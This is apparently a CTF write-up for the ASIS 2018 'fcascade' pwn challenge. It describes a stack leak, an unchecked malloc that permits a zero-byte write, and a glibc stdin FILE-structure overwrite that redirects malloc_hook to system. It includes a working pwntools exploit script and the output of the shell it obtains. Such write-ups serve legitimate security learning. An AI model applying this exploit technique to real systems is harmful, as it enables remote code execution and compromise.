---
layout: post
category: Pwn
title: ASIS CTF Quals 2018 fcascade
tags: 
    - kowu
---

We were only provided with the binary. A first look at the challenge revealed an obvious memory leak (in the 'leak' function).
It was reading input without zero terminating into a buffer on the stack and printing it out afterwards.
We can dump some old stack content with this method. On my local machine I found out that one interesting address in the dump belongs to libc's `__libc_start_main_ret` and we can use it to retrieve libc's base address.
Also a [libc database search](https://libc.blukat.me/?q=__libc_start_main_ret%3A830) revealed that we probably have a `libc6_2.23-0ubuntu[3,7,9,10]_amd64` on the remote target. So far so good.



Besides the 'leak' function there was also a 'ccloud' one.
```c
void ccloud()
{
  size_t size;
  void *buf;

  for (buf = 0LL;;free(buf))
  {
    write(1, "> ", 2uLL);
    _isoc99_scanf("%lu", &size);
    getchar();
    buf = malloc(size);
    write(1, "> ", 2uLL);
    read(0, buf, size);
    *((_BYTE *)buf + size - 1) = 0;
  }
}
```
The bug here resides in the nonexistent return value error handling of malloc. If malloc returns zero, for example if there isn't enough space, the follow up read will fail as well (but not crash). Nevertheless `*((_BYTE *)buf + size - 1) = 0;` will write a zerobyte at `size - 1`. So we can write to a location of our choice! But how to turn this into RCE? The answer lies in how file streams are handled in glibc. Besides kernel buffering there is userland buffering as well for all cstdlib functions with file streams. Let's take a look at the relevant structure `_IO_FILE`.
```c
struct _IO_FILE
{
  int _flags;                /* High-order word is _IO_MAGIC; rest is flags. */
  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;        /* Current read pointer */
  char *_IO_read_end;        /* End of get area. */
  char *_IO_read_base;        /* Start of putback+get area. */
  char *_IO_write_base;        /* Start of put area. */
  char *_IO_write_ptr;        /* Current put pointer. */
  char *_IO_write_end;        /* End of put area. */
  char *_IO_buf_base;        /* Start of reserve area. */
  char *_IO_buf_end;        /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */
  struct _IO_marker *_markers;
  struct _IO_FILE *_chain;
  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];
  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```
`_IO_buf_base` and `_IO_buf_end` are of special interest for us. They define the boundaries of the filestream's buffer. There is no extra field for the size of the buffer, it gets calculated via `end - base`.

![m1](/assets/img/asis_fstream.png)

If we can now overwrite the LSB of `_IO_buf_base` with a zero, we are able to overwrite all the red marked parts of the structure by the next call of scanf. We then simply overwrite the base and end pointers with an address range of our choice and can go get a shell. I used the malloc hook for this purpose. To turn `malloc(size)` into a `system("/bin/sh")` scanf needs to succesfully parse a number wich represents the memoryaddress containing the '/bin/sh' string. As the IO buffer is consuming all it's bytes first before reading new ones, it is sufficient to place the number string for fscanf somewhere at the end in the overwritten structure where it doesn't bother (it doesn't seem to bother `_IO_backup_base`). When all bytes are consumed by scanf and getchar new bytes are read at the location of our choice (malloc hook) and the next malloc call will result in a shell.

```python
from pwn import *

# __libc_start_main_ret 830 -> libc6_2.23-0ubuntu[3,7,9,10]_amd64
offset___libc_start_main_ret = 0x020830
offset___IO_2_1_stdin_ = 0x3c48e0
offset_system = 0x045390
offset_str_bin_sh = 0x18cd57


def leaklibc(r):
    r.send("11010110")
    r.recvuntil("> ")
    r.send("A" * 0x98)
    r.recvn(0x98)
    res = r.recvuntil("> ")[:-2]
    res = res + '\x00' * (8 - len(res))
    res = struct.unpack("<Q", res)[0] - offset___libc_start_main_ret
    r.send("11111111")
    r.recvuntil("> ")
    return res


def pwn(r):
    r.recvline()
    r.recvuntil("> ")
    libcbase = leaklibc(r)
    log.info("libc {:x}".format(libcbase))
    _IO_2_1_stdin_ = libcbase + offset___IO_2_1_stdin_

    r.send("10110101")
    r.recvuntil("> ")
    r.send(
        str(_IO_2_1_stdin_ + 0x38 + 1) + "\n" +         # overwrites LSB of _IO_buf_base
        struct.pack("<Q", _IO_2_1_stdin_ + 0x83) * 3 +  # partial new _IO_FILE struct
        struct.pack("<Q", _IO_2_1_stdin_ + 0x220) +     # new buf_base
        struct.pack("<Q", _IO_2_1_stdin_ + 0x240) +     # new buf_end
        "\x00" * 8 + str(libcbase + offset_str_bin_sh)  # number for scanf to parse
    )
    r.recvuntil("> > > ")
    r.send(struct.pack("<Q", libcbase + offset_system) * 4)
    r.interactive()


if __name__ == '__main__':
    pwn(remote('178.62.40.102', 6002))
```
shell :)

```
[x] Opening connection to 178.62.40.102 on port 6002
[x] Opening connection to 178.62.40.102 on port 6002: Trying 178.62.40.102
[+] Opening connection to 178.62.40.102 on port 6002: Done
[*] libc 7f0e51e36000
[*] Switching to interactive mode
> > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > 
cat /home/pwn/flag
ASIS{1b706201df43717ba2b6a7c41191ec1205fc908d}
```
